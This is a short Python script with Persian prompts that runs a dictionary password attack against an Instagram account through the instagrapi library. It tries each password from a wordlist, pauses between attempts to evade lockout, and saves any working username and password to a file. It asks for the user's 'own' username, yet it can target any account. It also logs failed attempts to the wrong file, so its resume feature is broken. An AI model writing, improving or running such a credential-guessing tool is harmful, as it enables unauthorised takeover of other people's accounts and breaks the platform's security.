import time
import os
from instagrapi import Client



pass_file ="passwords.txt"


used_passfile = "used_passwords.txt"


dely_between_tries = 60


target_username = input("👤 نام کاربری اینستاگرام خود را وارد کن: ").strip()

used_passwords = set()
if os.path.exists(used_passfile):
    with open(used_passfile, "r") as f:
        used_passwords = set(line.strip() for line in f.readlines())


with open(pass_file, "r") as f:
    all_passwords = [line.strip() for line in f.readlines() if line.strip() not in used_passwords]

print(f"🔍 شروع تست {len(all_passwords)} رمز عبور برای کاربر @{target_username}")

cl = Client()

for idx, password in enumerate(all_passwords):
    print(f"[{idx+1}/{len(all_passwords)}] تست رمز: {password}")
    try:
        cl.login(target_username, password)
        print("\n✅✅✅ موفق شدی وارد بشی!")
        print(f"رمز درست: {password}")
        with open("successful_login.txt", "w") as f:
            f.write(f"Username: {target_username}\nPassword: {password}\n")
        break
    except Exception as e:
        print("❌ ورود ناموفق. ادامه...")
        with open(target_username, "a") as f:
            f.write(password + "\n")
        time.sleep(dely_between_tries)

else:
    print("⛔ هیچ رمزی کار نکرد. بررسی کن شاید رمز جدیدی استفاده کرده باشی یا ورود دو مرحله‌ای فعاله.")
